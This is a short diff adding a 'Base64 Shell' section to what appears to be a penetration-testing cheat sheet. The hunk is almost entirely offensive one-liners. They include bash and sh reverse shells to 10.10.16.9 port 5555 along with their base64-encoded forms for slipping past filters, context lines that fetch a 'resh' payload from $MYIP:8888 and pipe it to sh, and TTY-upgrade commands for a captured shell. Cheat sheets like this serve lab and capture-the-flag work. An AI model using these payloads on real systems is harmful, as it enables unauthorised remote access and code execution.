@@ -1366,6 +1366,13 @@ resh.py $MYIP 5555 /Upload/resh; resh.py $MYIP 5566 /Upload/resh_5566
 curl -s http://$MYIP:8888/resh | sh
 wget -qO- http://$MYIP:8888/resh | sh
 
++---------- Base64 Shell ----------+
+echo 'bash -i >& /dev/tcp/10.10.16.9/5555 0>&1' | base64
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45LzU1NTUgMD4mMQo=
+
+echo 'sh -i >& /dev/tcp/10.10.16.9/5555 0>&1' | base64
+c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuOS81NTU1IDA+JjEK
+
 +---------- Upgrade TTY ----------+
 script /dev/null -c bash
 python3 -c 'import pty; pty.spawn("/bin/bash")';
